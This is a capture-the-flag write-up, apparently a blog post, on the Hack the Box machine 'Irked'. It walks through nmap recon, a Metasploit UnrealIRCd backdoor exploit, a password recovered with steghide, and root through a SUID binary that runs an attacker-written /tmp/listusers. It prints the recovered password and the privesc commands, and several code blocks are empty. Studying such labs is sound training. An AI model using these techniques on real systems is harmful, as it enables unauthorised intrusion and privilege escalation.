## 1. Machine Info

Irked is an easy-rated, retired machine from Hack the Box. And it is fairly rated I would say, even if the privesc part was little tricky if you don't know what is steganography.

(machine pic)

But still, it was a doable machine and I had fun.

> As always, let's dive into the machine!

## 2. Recon

Starting with initial nmap scan:

```
PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 63
80/tcp    open  http       syn-ack ttl 63
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind    syn-ack ttl 63
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35284/tcp   status
|   100024  1          48441/tcp6  status
|   100024  1          51878/udp   status
|_  100024  1          56479/udp6  status
6697/tcp  open  ircs-u     syn-ack ttl 63
8067/tcp  open  infi-async syn-ack ttl 63
35284/tcp open  status     syn-ack ttl 63
65534/tcp open  unknown    syn-ack ttl 63
```

So there are several services. Let's list all of them

- ssh
- http
- rpc
- ircs-u, info-async (6697 and 8067)
- two unknown services (likely out of scope)

Let's start our enumeration.

## 3. Enumeration

Since ssh is very likely not vulnerable, I'll start with http

### 3.1 HTTP 80

Index page shows just a single photo:

(potato)

I tried subdirectory enumeration:

```

```

But nothing was really interesting. Since we also don't have a dedicated domain name, that's it for http, I guess.

### 3.2 Port 8067, 6697 

Port 8067, 6697 have a running service named "irc"

```

I'll dig deeper into this service, since this is only option.

## 4. Initial Foothold

We had the keyword unrealircd. I searched for cve:

```

```
There is a metasploit module. Even if we don't have version number of current irc session, it's worth trying it.
```

[*] Found python at /usr/bin/python

```
I had to struggle for a while to find a suitable payload, but it dropped a shell as user "ircd" at the end.

## 5. Shell as user djmardov

Running linenum.sh:

```

```
We have a read permission on .backup in djmardov folder. This is indeed suspicious.

```
ircd@irked:~/Unreal3.2$ cat /home/djmardov/Documents/.backup
cat /home/djmardov/Documents/.backup
Super elite steg backup pw

```
What is steg bacup pw? This was a tricky part. Steg indicates that the password is hidden via steganography.
> Steganography is the practice of concealing information within another message or physical object to avoid detection.
Have we seen any images before? yes, the potato photo from 80. I'll use steghide to extract password out of it.

```
┌──(hosan㉿kali)-[~/oscp/htb-box/irked]
└─$ steghide extract -sf irked.jpg
Enter passphrase: 
wrote extracted data to "pass.txt".
                                                                                                                   
┌──(hosan㉿kali)-[~/oscp/htb-box/irked]
└─$ cat pass.txt         
Kab6h+m+bbp2J:HG
```

And we could log in via ssh.

## 6. Shell as root

I ran linpeas once more. After looking for a while, I found:

> -rwsr-xr-x 1 root root 7.2K May 16 2018 /usr/bin/viewuser (Unknown SUID binary!)

Maybe it's worth digging deeper.
```
djmardov@irked:/tmp$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2024-08-17 08:28 (:0)
djmardov pts/1        2024-08-17 09:22 (10.10.16.14)
sh: 1: /tmp/listusers: not found
djmardov@irked:/tmp$ 
```

Okay, let's quickly create listusers  in /tmp to see what happenes with echo "hello" > listuser

```
djmardov@irked:/tmp$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2024-08-17 08:28 (:0)
djmardov pts/1        2024-08-17 09:22 (10.10.16.14)
/tmp/listusers: 1: /tmp/listusers: hello: not found
```

So It tries to execute our input. Since there is no script named "hello", it throws not found error. 


It will give me a shell with /bin/bash.

```
djmardov@irked:/tmp$ echo "/bin/bash" > listusers
djmardov@irked:/tmp$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2024-08-17 08:28 (:0)
djmardov pts/1        2024-08-17 09:22 (10.10.16.14)
root@irked:/tmp# djmardov@irked:
```
We got root. Done!
